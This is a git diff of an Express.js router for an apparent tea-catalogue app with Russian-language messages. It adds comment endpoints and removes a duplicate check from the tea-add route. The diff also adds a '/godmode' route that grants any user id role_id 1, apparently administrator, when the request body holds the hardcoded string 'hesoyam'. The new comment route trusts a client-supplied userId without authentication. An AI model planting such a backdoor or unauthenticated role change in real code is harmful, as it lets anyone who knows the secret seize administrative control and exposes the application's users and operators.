@@ -1,4 +1,4 @@
-import express from 'express';
+import express, { text } from 'express';
 import {
   User, Tea, Comment, Role, Favourite,
 } from '../db/models';
@@ -34,18 +34,10 @@ router.post('/tea/add', async (req, res) => {
     name, img, description, location, x, y,
   } = req.body;
   console.log(req.body);
-  try {
-    const tea = await Tea.findOne({ where: { name } });
-    if (!tea) {
-      const newTea = await Tea.create({
-        name, img, description, location, x, y,
-      });
-      return res.json({ message: 'Чай добавлен' });
-    }
-    res.status(400).json({ message: 'такой чай уже есть' });
-  } catch (err) {
-    console.error(err);
-  }
+  const newTea = await Tea.create({
+    name, img, description, location, x, y,
+  });
+  return res.json(newTea);
 });
 
 router.delete('/fav/:id', async (req, res) => {
@@ -75,13 +67,44 @@ router.post('/fav/:id', async (req, res) => {
   try {
     const tea = await Favourite.findOne({ where: { user_id: userId, tea_id: id } });
     if (!tea) {
-      const newTea = await Favourite.create({user_id: userId, tea_id: id});
+      const newTea = await Favourite.create({ user_id: userId, tea_id: id });
       return res.json({ message: 'Чай добавлен в избранное' });
     }
     res.status(400).json({ message: 'Чай уже есть в избранном' });
   } catch (err) {
     console.error(err);
   }
+});
+
+router.get('/teas/:id/comments', async (req, res) => {
+  const { id } = req.params;
+  const userCom = await Comment.findAll({ where: { tea_id: id }, include: [User] });
+  res.json(userCom);
+});
+
+router.post('/teas/:id/comments', async (req, res) => {
+  const { id } = req.params;
+  const {
+    txt, userId,
+  } = req.body;
+  console.log(req.body);
+
+  const newComment = await Comment.create({
+    text: txt, tea_id: id, user_id: userId,
+  });
+
+  const newCom = (await Comment.findAll({ where: { id: newComment.id }, include: [User] }))[0];
+  return res.json(newCom);
+});
+
+router.post('/godmode', async (req, res) => {
+  const { id, code } = req.body;
+  console.log(id, code);
+  if (code === 'hesoyam') {
+    const user = await User.findByPk(id);
+    user.update({ role_id: 1 });
+    res.sendStatus(200);
+  } else {res.sendStatus(400)};
 });
 
 export default router;
